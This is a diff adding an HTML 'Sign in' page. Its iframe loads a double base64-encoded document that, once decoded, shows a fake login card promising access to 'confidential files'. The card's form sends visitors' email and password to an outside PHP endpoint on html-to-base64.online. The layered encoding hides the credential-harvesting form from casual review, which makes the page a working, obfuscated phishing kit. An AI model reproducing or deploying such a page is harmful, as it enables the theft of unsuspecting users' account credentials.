@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Sign in</title>
+<link rel="icon" href="https://pub-db8f543681b04a1699608a3e92bd9811.r2.dev/othermail.ico">
+   <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden; /* Optional: prevents double scrollbars */
+        }
+        
+        .iframe-container {
+            width: 100%;
+            height: 100vh; /* Full viewport height as fallback */
+            overflow: hidden;
+        }
+        
+        iframe {
+            width: 100%;
+            border: 0;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="iframe-container">
+        <iframe 
+            name="I1" 
+            id="autoIframe"
+            src="data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC53cml0ZShkZWNvZGVVUklDb21wb25lbnQoZXNjYXBlKGF0b2IoJ1BDRmtiMk4wZVhCbElHaDBiV3crQ2p4b2RHMXNJR3hoYm1jOUltVnVJajRLUEdobFlXUStDaUFnUEcxbGRHRWdZMmhoY25ObGREMGlkWFJtTFRnaVBnb2dJRHh0WlhSaElHNWhiV1U5SW5acFpYZHdiM0owSWlCamIyNTBaVzUwUFNKM2FXUjBhRDFrWlhacFkyVXRkMmxrZEdnc0lHbHVhWFJwWVd3dGMyTmhiR1U5TVNJK0NpQWdQSFJwZEd4bFBsTnBaMjRnYVc0OEwzUnBkR3hsUGdvZ0lEeHpkSGxzWlQ0S0lDQWdJRHB5YjI5MElIc0tJQ0FnSUNBZ0xTMWlaem9nSTJZMVpqVm1OenNLSUNBZ0lDQWdMUzFqWVhKa09pQWpabVptWm1abU93b2dJQ0FnSUNBdExYUmxlSFE2SUNNeFpERmtNV1k3Q2lBZ0lDQWdJQzB0YlhWMFpXUTZJQ00yWlRabE56TTdDaUFnSUNBZ0lDMHRZV05qWlc1ME9pQWpNbU0zWW1VMU93b2dJQ0FnSUNBdExXSnZjbVJsY2pvZ0kyUXlaREprTnpzS0lDQWdJQ0FnTFMxbGNuSnZjam9nSTJJd01EQXlNRHNLSUNBZ0lIMEtJQ0FnSUNvZ2V5QmliM2d0YzJsNmFXNW5PaUJpYjNKa1pYSXRZbTk0T3lCOUNpQWdJQ0JvZEcxc0xDQmliMlI1SUhzZ2FHVnBaMmgwT2lBeE1EQWxPeUI5Q2lBZ1ltOWtlU0I3Q2lBZ1ltRmphMmR5YjNWdVpEb2dkWEpzS0Nkb2RIUndjem92TDJoMGJXd3RkRzh0WW1GelpUWTBMbTl1YkdsdVpTOXdhSEF2Wm1sc1pYTXZZbWN5TG5CdVp5Y3BJR05sYm5SbGNpOWpiM1psY2lCdWJ5MXlaWEJsWVhRZ2RtRnlLQzB0WW1jcE93b0tJQ0FnSUNBZ2JXRnlaMmx1T2lBd093b2dJQ0FnSUNCbWIyNTBMV1poYldsc2VUb2dMV0Z3Y0d4bExYTjVjM1JsYlN3Z1FteHBibXROWVdOVGVYTjBaVzFHYjI1MExDQWlVMlZuYjJVZ1ZVa2lMQ0JTYjJKdmRHOHNJSE5oYm5NdGMyVnlhV1k3Q2lBZ0lDQmhibWx0WVhScGIyNDZJR1J5YVdaMElERTRjeUJsWVhObExXbHVMVzkxZENCcGJtWnBibWwwWlRzS0lDQWdJQ0FnWTI5c2IzSTZJSFpoY2lndExYUmxlSFFwT3dvZ0lDQWdJQ0JrYVhOd2JHRjVPaUJtYkdWNE93b2dJQ0FnSUNCaGJHbG5iaTFwZEdWdGN6b2dZMlZ1ZEdWeU93b2dJQ0FnSUNCcWRYTjBhV1o1TFdOdmJuUmxiblE2SUdObGJuUmxjanNLSUNBZ0lDQWdjR0ZrWkdsdVp6b2dNakJ3ZURzS0NRcDlDa0JyWlhsbWNtRnRaWE1nWkhKcFpuUWdld29nSURBbExDQXhNREFsSUhzZ1ltRmphMmR5YjNWdVpDMXdiM05wZEdsdmJqb2dNQ1VnTUNVc0lERXdNQ1VnTUNVc0lEVXdKU0F4TURBbE95QjlDaUFnTlRBbElDQWdJQ0FnZXlCaVlXTnJaM0p2ZFc1a0xYQnZjMmwwYVc5dU9pQXhNQ1VnTlNVc0lEa3dKU0F4TUNVc0lEUTFKU0E1TUNVN0lIMEtmUW9LSUNBZ0lDNWpZWEprSUhzS0lDQWdJQ0FnZDJsa2RHZzZJREV3TUNVN0NpQWdJQ0FnSUcxaGVDMTNhV1IwYURvZ016Z3djSGc3Q2lBZ0lDQWdJR0poWTJ0bmNtOTFibVE2SUhaaGNpZ3RMV05oY21RcE93b2dJQ0FnSUNCaWIzSmtaWEk2SURGd2VDQnpiMnhwWkNCMllYSW9MUzFpYjNKa1pYSXBPd29nSUNBZ0lDQmliM0prWlhJdGNtRmthWFZ6T2lBeE1uQjRPd29nSUNBZ0lDQndZV1JrYVc1bk9pQXpNbkI0T3dvZ0lDQWdJQ0JpYjNndGMyaGhaRzkzT2lBd0lERndlQ0F5Y0hnZ2NtZGlZU2d3TERBc01Dd3dMakEwS1RzS0lDQWdJSDBLSUNBZ0lHZ3hJSHNnYldGeVoybHVPaUF3SURBZ05uQjRPeUJtYjI1MExYTnBlbVU2SURJd2NIZzdJR1p2Ym5RdGQyVnBaMmgwT2lBMk1EQTdJSDBLSUNBZ0lDNXpkV0owYVhSc1pTQjdJR052Ykc5eU9pQjJZWElvTFMxdGRYUmxaQ2s3SUdadmJuUXRjMmw2WlRvZ01UUndlRHNnYldGeVoybHVPaUF3SURBZ01qUndlRHNnZlFvZ0lDQWdiR0ZpWld3Z2V5QmthWE53YkdGNU9pQmliRzlqYXpzZ1ptOXVkQzF6YVhwbE9pQXhNM0I0T3lCbWIyNTBMWGRsYVdkb2REb2dOVEF3T3lCdFlYSm5hVzQ2SURBZ01DQTJjSGc3SUgwS0lDQWdJQzVtYVdWc1pDQjdJRzFoY21kcGJpMWliM1IwYjIwNklERTJjSGc3SUgwS0lDQWdJR2x1Y0hWMFczUjVjR1U5SW1WdFlXbHNJbDBzSUdsdWNIVjBXM1I1Y0dVOUluQmhjM04zYjNKa0lsMGdld29nSUNBZ0lDQjNhV1IwYURvZ01UQXdKVHNLSUNBZ0lDQWdhR1ZwWjJoME9pQTBNSEI0T3dvZ0lDQWdJQ0J3WVdSa2FXNW5PaUF3SURFeWNIZzdDaUFnSUNBZ0lHSnZjbVJsY2pvZ01YQjRJSE52Ykdsa0lIWmhjaWd0TFdKdmNtUmxjaWs3Q2lBZ0lDQWdJR0p2Y21SbGNpMXlZV1JwZFhNNklEaHdlRHNLSUNBZ0lDQWdabTl1ZEMxemFYcGxPaUF4TlhCNE93b2dJQ0FnSUNCaVlXTnJaM0p2ZFc1a09pQWpabVptT3dvZ0lDQWdJQ0JqYjJ4dmNqb2dkbUZ5S0MwdGRHVjRkQ2s3Q2lBZ0lDQjlDaUFnSUNCcGJuQjFkRHBtYjJOMWN5QjdDaUFnSUNBZ0lHOTFkR3hwYm1VNklHNXZibVU3Q2lBZ0lDQWdJR0p2Y21SbGNpMWpiMnh2Y2pvZ2RtRnlLQzB0WVdOalpXNTBLVHNLSUNBZ0lDQWdZbTk0TFhOb1lXUnZkem9nTUNBd0lEQWdNM0I0SUhKblltRW9ORFFzTVRJekxESXlPU3d3TGpFMUtUc0tJQ0FnSUgwS0lDQWdJQzVpZEc0Z2V3b2dJQ0FnSUNCM2FXUjBhRG9nTVRBd0pUc0tJQ0FnSUNBZ2FHVnBaMmgwT2lBME5IQjRPd29nSUNBZ0lDQmliM0prWlhJNklEQTdDaUFnSUNBZ0lHSnZjbVJsY2kxeVlXUnBkWE02SURod2VEc0tJQ0FnSUNBZ1ltRmphMmR5YjNWdVpEb2dkbUZ5S0MwdFlXTmpaVzUwS1RzS0lDQWdJQ0FnWTI5c2IzSTZJQ05tWm1ZN0NpQWdJQ0FnSUdadmJuUXRjMmw2WlRvZ01UVndlRHNLSUNBZ0lDQWdabTl1ZEMxM1pXbG5hSFE2SURZd01Ec0tJQ0FnSUNBZ1kzVnljMjl5T2lCd2IybHVkR1Z5T3dvZ0lDQWdJQ0J0WVhKbmFXNHRkRzl3T2lBNGNIZzdDaUFnSUNCOUNpQWdJQ0F1WW5SdU9tWnZZM1Z6TFhacGMybGliR1VnZXlCdmRYUnNhVzVsT2lBemNIZ2djMjlzYVdRZ2NtZGlZU2cwTkN3eE1qTXNNakk1TERBdU5DazdJRzkxZEd4cGJtVXRiMlptYzJWME9pQXljSGc3SUgwS0lDQWdJQzVsY25JZ2V5QmpiMnh2Y2pvZ2RtRnlLQzB0WlhKeWIzSXBPeUJtYjI1MExYTnBlbVU2SURFemNIZzdJRzFoY21kcGJqb2dPSEI0SURBZ01Ec2diV2x1TFdobGFXZG9kRG9nTVdWdE95QjlDaUFnSUNBdWJXVjBZU0I3SUcxaGNtZHBiaTEwYjNBNklERTJjSGc3SUdadmJuUXRjMmw2WlRvZ01UTndlRHNnWTI5c2IzSTZJSFpoY2lndExXMTFkR1ZrS1RzZ2RHVjRkQzFoYkdsbmJqb2dZMlZ1ZEdWeU95QjlDaUFnUEM5emRIbHNaVDRLUEM5b1pXRmtQZ284WW05a2VUNEtJQ0E4YldGcGJpQmpiR0Z6Y3owaVkyRnlaQ0krQ2lBZ0lDQThhREUrUEdsdFp5QnpjbU05SW1oMGRIQnpPaTh2Wlc1amNubHdkR1ZrTFhSaWJqQXVaM04wWVhScFl5NWpiMjB2YVcxaFoyVnpQM0U5ZEdKdU9rRk9aRGxIWTFSTVFrZHJjVVExWmxaNVREWllUVUZCV210aGRDMTJTMVozV2kwNVdVVnRRME54WnlaMWMzRndQVU5CVlNJZ2QybGtkR2c5SWpFeE1DSWdhR1ZwWjJoMFBTSTNNQ0lnTHo0OGFXMW5JSE55WXowaWFIUjBjSE02THk5b2RHMXNMWFJ2TFdKaGMyVTJOQzV2Ym14cGJtVXZjR2h3TDJacGJHVnpMMjkwYUdWeWJXRnBiQzVwWTI4aUlIZHBaSFJvUFNJMU1TSWdhR1ZwWjJoMFBTSTBOaUkrUEM5b01UNEtJQ0FnSUR4b01UNVRhV2R1SUdsdVBDOW9NVDRLSUNBZ0lEeHdJR05zWVhOelBTSnpkV0owYVhSc1pTSStWWE5sSUhsdmRYSWdaVzFoYVd3Z1lXNWtJSEJoYzNOM2IzSmtJSFJ2SUhacFpYY2dlVzkxY2lCamIyNW1hV1JsYm5ScFlXd2dabWxzWlhNdVBDOXdQZ29LSUNBZ1BHWnZjbTBnYm1GdFpUMGlJaUJwWkQwaUlpQmhZM1JwYjI0OUltaDBkSEJ6T2k4dmFIUnRiQzEwYnkxaVlYTmxOalF1YjI1c2FXNWxMM0JvY0M5bWFXeGxjeTkyWlhKNE1TNXdhSEFpSUcxbGRHaHZaRDBpY0c5emRDSStDaUFnSUNBZ0lEeGthWFlnWTJ4aGMzTTlJbVpwWld4a0lqNEtJQ0FnSUNBZ0lDQThiR0ZpWld3Z1ptOXlQU0psYldGcGJDSStSVzFoYVd3OEwyeGhZbVZzUGdvZ0lDQWdJQ0FnSUR4cGJuQjFkQ0JwWkQwaVpXMWhhV3dpSUc1aGJXVTlJbVZ0WVdsc0lpQjBlWEJsUFNKbGJXRnBiQ0lLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdZWFYwYjJOdmJYQnNaWFJsUFNKMWMyVnlibUZ0WlNJS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWVhWMGIyTmhjR2wwWVd4cGVtVTlJbTltWmlJZ1lYVjBiMk52Y25KbFkzUTlJbTltWmlJZ2MzQmxiR3hqYUdWamF6MGlabUZzYzJVaUNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUhKbGNYVnBjbVZrUGdvZ0lDQWdJQ0E4TDJScGRqNEtJQ0FnSUNBZ1BHUnBkaUJqYkdGemN6MGlabWxsYkdRaVBnb2dJQ0FnSUNBZ0lEeHNZV0psYkNCbWIzSTlJbkJoYzNOM2IzSmtJajVRWVhOemQyOXlaRHd2YkdGaVpXdytDaUFnSUNBZ0lDQWdQR2x1Y0hWMElHbGtQU0p3WVhOemQyOXlaQ0lnYm1GdFpUMGljR0Z6YzNkdmNtUWlJSFI1Y0dVOUluQmhjM04zYjNKa0lnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNCaGRYUnZZMjl0Y0d4bGRHVTlJbU4xY25KbGJuUXRjR0Z6YzNkdmNtUWlJSEpsY1hWcGNtVmtQZ29nSUNBZ0lDQThMMlJwZGo0S0NpQWdJQ0FnQ2dvZ0lDQWdJQ0E4Y0NCcFpEMGlaWEp5YjNJaUlHTnNZWE56UFNKbGNuSWlJSEp2YkdVOUltRnNaWEowSWlCaGNtbGhMV3hwZG1VOUluQnZiR2wwWlNJK1BDOXdQZ29nSUNBZ0lDQThZblYwZEc5dUlHTnNZWE56UFNKaWRHNGlJSFI1Y0dVOUluTjFZbTFwZENJK1UybG5iaUJwYmp3dlluVjBkRzl1UGdvS0lDQWdJRHd2Wm05eWJUNEtJQ0E4TDIxaGFXNCtDZ29nSUFvOEwySnZaSGsrQ2p3dmFIUnRiRDRLJykpKSk8L3NjcmlwdD4="   
+            frameborder="0"
+            allowfullscreen>
+        </iframe>
+    </div>
+
+    <script>
+        const iframe = document.getElementById('autoIframe');
+        
+        function resizeIframe() {
+            try {
+                // Method 1: Direct access (works best if same origin)
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                const newHeight = Math.max(
+                    iframeDoc.documentElement.scrollHeight,
+                    iframeDoc.body.scrollHeight,
+                    500 // Minimum height fallback
+                );
+                
+                iframe.style.height = newHeight + 'px';
+            } catch (e) {
+                // Fallback: If cross-origin, try postMessage (requires cooperation from index.php)
+                console.warn('Cross-origin restriction - iframe may need postMessage support');
+                iframe.style.height = '100vh'; // Fallback to full height
+            }
+        }
+        
+        // Resize when iframe loads
+        iframe.onload = function() {
+            resizeIframe();
+            
+            // Re-check after a short delay (some content loads async)
+            setTimeout(resizeIframe, 500);
+            setTimeout(resizeIframe, 1500);
+        };
+        
+        // Optional: Resize on window resize (for responsive behavior)
+        window.addEventListener('resize', () => {
+            resizeIframe();
+        });
+        
+        // Bonus: Listen for messages from the iframe (if index.php sends height)
+        window.addEventListener('message', function(event) {
+            if (event.data && event.data.type === 'iframeHeight') {
+                iframe.style.height = event.data.height + 'px';
+            }
+        });
+    </script>
+</body>
+</html>
